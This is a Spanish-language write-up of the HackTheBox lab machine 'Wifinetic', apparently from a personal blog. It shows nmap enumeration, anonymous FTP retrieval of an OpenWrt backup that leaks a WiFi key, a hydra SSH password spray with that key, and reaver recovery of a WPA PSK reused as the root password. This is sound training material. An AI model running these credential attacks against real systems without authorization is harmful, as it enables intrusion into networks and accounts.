---
title: HackTheBox - Wifinetic
author: cotes
date: 2023-09-14 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Information Leakage', 'Cracking WPA/WPA2 Password']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Wifinetic/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Wifinetic Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **Information Leakage, Cracking WPA/WPA2 Password**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Wifinetic/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Wifinetic/02-versions.png)

* Como está habilitada la autenticación 'anónima' en FTP, listamos los ficheros existentes y los descargamos

c. Con los ficheros en nuestra máquina, listamos toda la información posible.

```bash
❯ 7z x backup-OpenWrt-2023-07-26.tar
❯ cat config/wireless
    <SNIP>
    option key 'VeRyUniUqWiFIPasswrd1!'

❯ cat passwd

root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

* Guardamos estos nombres de usuario en una fichero y realizaremos un ataque de fuerza bruta al servicio ssh con hydra

    ```bash
    ❯ cat passwd | awk '{print $1}' FS=':' > users.txt
    ❯ hydra -L users.txt -p 'VeRyUniUqWiFIPasswrd1!' ssh://10.10.11.247 -t 4

    [22][ssh] host: 10.10.11.247   login: netadmin   password: VeRyUniUqWiFIPasswrd1!
    ```

### Escalada de Privilegios 💹

a. Contamos con múltiples interfaces de red y vemos una **capability** asignada a 'reaver'

```bash
netadmin@wifinetic:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
    inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
    ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)

netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

> **Reaver** es una herramienta usado para pentesting en redes que tienen habilitado el protocolo WPA/WPA2
{: .prompt-info }

b. Para usar esta herramienta necesitamos una interfaz de red en modo monitor 'mon0', la dirección MAC y el canal en el cual opera esta interfaz

```bash
netadmin@wifinetic:~$ iw dev

<SNIP>
phy#0
    Interface wlan0
        ifindex 3
        wdev 0x1
        addr 02:00:00:00:00:00
        ssid OpenWrt
        type AP
        channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
        txpower 20.00 dBm

netadmin@wifinetic:~$ reaver  -i mon0 -b 02:00:00:00:00:00 -c 1 -vv

<SNIP>
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
```

* Con la credencial antes obtenida podemos acceder como root al sistema

    ```bash
    netadmin@wifinetic:~$ su root
    Password: WhatIsRealAnDWhAtIsNot51121!
    root@wifinetic:/home/netadmin#
    ```